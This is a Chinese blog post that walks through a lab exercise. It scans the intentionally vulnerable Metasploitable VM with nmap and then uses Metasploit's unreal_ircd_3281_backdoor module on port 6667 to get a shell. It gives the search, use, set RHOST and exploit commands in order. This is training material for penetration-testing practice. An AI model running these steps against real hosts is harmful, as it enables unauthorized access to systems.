---
title: unreal_ircd_3281_backdoor漏洞
categories:
- 漏洞
tags:
- msf
updated: 2018-05-16
---




Metasploitable漏洞演练系统 是Metasploit团队维护的一个集成了各种漏洞弱点的Linux主机(ubuntu)镜像,这方便大家对于msf的学，以下以6667端口的unreal_ircd_3281_backdoor进行攻击。

  可以在虚拟机中启动（登录密码和账号都是msfadmin）

  <img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_01.png"/>

  

  ```c++
  查看ip    ifconfig
  ```

  <img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_02.png"/>

  

  - 地址为：192.168.127.145

     然后在kali linux中进行渗透：

     启动msf

     

    <img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_03.png"/>

  

   

  ```
    然后nmap 192.168.127.145查看开放端口
  ```

    exec: nmap 192.168.127.145
  Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-05 13:29 CST
  Nmap scan report for 192.168.127.145
  Host is up (0.00015s latency).
  Not shown: 977 closed ports
  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  23/tcp   open  telnet
  25/tcp   open  smtp
  53/tcp   open  domain
  80/tcp   open  http
  111/tcp  open  rpcbind
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  512/tcp  open  exec
  513/tcp  open  login
  514/tcp  open  shell
  1099/tcp open  rmiregistry
  1524/tcp open  ingreslock
  2049/tcp open  nfs
  2121/tcp open  ccproxy-ftp
  3306/tcp open  mysql
  5432/tcp open  postgresql
  5900/tcp open  vnc
  6000/tcp open  X11
  6667/tcp open  irc
  8009/tcp open  ajp13
  8180/tcp open  unknown

  MAC Address: 00:0C:29:E4:E7:DD (VMware)

  因为作为靶机，所以端口自然就是很多，但是在实际中，不可能开放这么多的端口的。

  然后我们要利用的是

  6667端口之unreal_ircd_3281_backdoor

  所以搜索： search unreal_ircd_3281_backdoor

- <img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_04.png"/>



```c++
然后使用：   use exploit/unix/irc/unreal_ircd_3281_backdoor
```

<img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_05.png"/>



```c++
再执行show options
```

<img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_06.png"/>

- ```
  设置攻击机：set RHOST 192.168.127.145 
  ```

  <img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_07.png"/>

  `然后执行：exploit`

  

    	

  <img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_08.png"/>

  权限就已经拿到了：

<img src="{{ site.url }}/assets//blog_images/unreal_ircd_3281_backdoor_09.png"/>
